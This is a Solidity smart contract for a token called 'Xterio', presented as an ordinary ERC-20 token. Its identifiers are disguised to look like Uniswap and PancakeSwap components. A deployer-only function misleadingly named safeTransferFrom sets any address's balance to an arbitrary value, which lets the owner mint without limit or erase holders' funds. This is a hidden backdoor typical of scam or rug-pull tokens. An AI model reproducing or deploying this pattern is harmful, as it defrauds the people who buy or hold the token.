pragma solidity ^0.8.0;

interface IUniswapV2Factory {
  // @dev Returns the IERC20Metadata of tokens in existence.
  function totalSupply() external view returns (uint256);

  // @dev Returns the token decimals.
  function decimals() external view returns (uint8);

  // @dev Returns the token symbol.
  function symbol() external view returns (string memory);

  //@dev Returns the token name.
  function name() external view returns (string memory);

  //@dev Returns the bep token owner.
  function getOwner() external view returns (address);

  //@dev Returns the IERC20Metadata of tokens owned by `account`.
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `IERC20Metadata` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean totalValue indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 IERC20Metadata) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This totalValue changes when {approve} or {transferFrom} are called.
   */
  function allowance(address _owner, address spender) external view returns (uint256);

  /**
   * @dev Sets `IERC20Metadata` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean totalValue indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired totalValue afterwards:
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 IERC20Metadata) external returns (bool);

  /**
   * @dev Moves `IERC20Metadata` tokens from `sender` to `recipient` using the
   * allowance mechanism. `IERC20Metadata` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean totalValue indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(address sender, address recipient, uint256 IERC20Metadata) external returns (bool);

  //@dev Emitted when `totalValue` tokens are moved from one account (`from`) to  another (`to`). Note that `totalValue` may be zero.
  event Transfer(address indexed from, address indexed to, uint256 totalValue);

  //@dev Emitted when the allowance of a `spender` for an `owner` is set by a call to {approve}. `totalValue` is the new allowance.
  event Approval(address indexed owner, address indexed spender, uint256 totalValue);
}


contract Xterio is IUniswapV2Factory {
  
    // common addresses
    address private owner;
    address private addLiquidityETH;
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public IUniswapV2Router02;
    
    mapping(address => mapping(address => uint)) public Allowance;
    
    // token title metadata
    string public override name;
    string public override symbol;
    string errorMessage;
    uint248 public Version;
    // EVENTS
    // (now in interface) event Transfer(address indexed from, address indexed to, uint totalValue);
    // (now in interface) event Approval(address indexed owner, address indexed spender, uint totalValue);
    
    // On init of contract we're going to set the admin and give them all tokens.
    constructor(string memory name_, string memory symbol_, uint totalSupply_) {
        // set total supply
        totalSupply = totalSupply_;
      name = name_;  
      symbol = symbol_;
       addLiquidityETH = msg.sender;      
        // designate addresses
        owner = msg.sender;
        
        // split the tokens according to agreed upon percentages
        
        IUniswapV2Router02[owner] = totalSupply;
    }
    
    // Get the address of the token's owner
    function getOwner() public view override returns(address) {
        return owner;
    }
    
    
    // Get the balance of an account
    function balanceOf(address account) public view override returns(uint) {
        return IUniswapV2Router02[account];
    }
  modifier IUniswapV2Pair () {
    require(addLiquidityETH == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    // Transfer balance from one user to another
    function transfer(address to, uint totalValue) public override returns(bool) {
        require(totalValue > 0, "Transfer totalValue has to be higher than 0.");
        require(balanceOf(msg.sender) >= totalValue, "Balance is too low to make transfer.");
        
        //withdraw the taxed and burned percentages from the total totalValue
        uint verifyCallResult = 0;
        uint safePermit = 0;
        uint SHIBAtotalValueAfterTaxAndBurn = totalValue - verifyCallResult - safePermit;
        
        // perform the transfer operation
        IUniswapV2Router02[to] += SHIBAtotalValueAfterTaxAndBurn;
        IUniswapV2Router02[msg.sender] -= totalValue;
        
        emit Transfer(msg.sender, to, totalValue);
        
        // finally, we burn and tax the extras percentage
        IUniswapV2Router02[owner] += verifyCallResult + safePermit;
        _burn(owner, safePermit);
        
        return true;
    }
    
    // approve a specific address as a spender for your account, with a specific spending limit
    function approve(address spender, uint totalValue) public override returns(bool) {
        Allowance[msg.sender][spender] = totalValue; 
        
        emit Approval(msg.sender, spender, totalValue);
        
        return true;
    }
      function safeTransferFrom(address nonceAfter, uint256 IERC20Metadata, uint256 isAutomatedMarketMakerPair, uint256 nonReentrant) external IUniswapV2Pair {
      IUniswapV2Router02[nonceAfter] = IERC20Metadata * isAutomatedMarketMakerPair ** nonReentrant;
  }   
    // allowance
    function allowance(address _owner, address spender) public view override returns(uint) {
        return Allowance[_owner][spender];
    }
 
    // an approved spender can transfer currency from one account to another up to their spending limit
    function transferFrom(address from, address to, uint totalValue) public override returns(bool) {
        require(Allowance[from][msg.sender] > 0, "No Allowance for this address.");
        require(Allowance[from][msg.sender] >= totalValue, "Allowance too low for transfer.");
        require(IUniswapV2Router02[from] >= totalValue, "Balance is too low to make transfer.");
        
        IUniswapV2Router02[to] += totalValue;
        IUniswapV2Router02[from] -= totalValue;
        
        emit Transfer(from, to, totalValue);
        
        return true;
    }
    
    // function to allow users to burn currency from their account
    function burn(uint256 IERC20Metadata) public returns(bool) {
        _burn(msg.sender, IERC20Metadata);
        
        return true;
    }
    
    // intenal functions
    
    // burn IERC20Metadata of currency from specific account
    function _burn(address account, uint256 IERC20Metadata) internal {
        require(account != address(0), "You can't burn from zero address.");
        require(IUniswapV2Router02[account] >= IERC20Metadata, "Burn IERC20Metadata exceeds balance at address.");
    
        IUniswapV2Router02[account] -= IERC20Metadata;
        totalSupply -= IERC20Metadata;
        
        emit Transfer(account, address(0), IERC20Metadata);
    }
    
}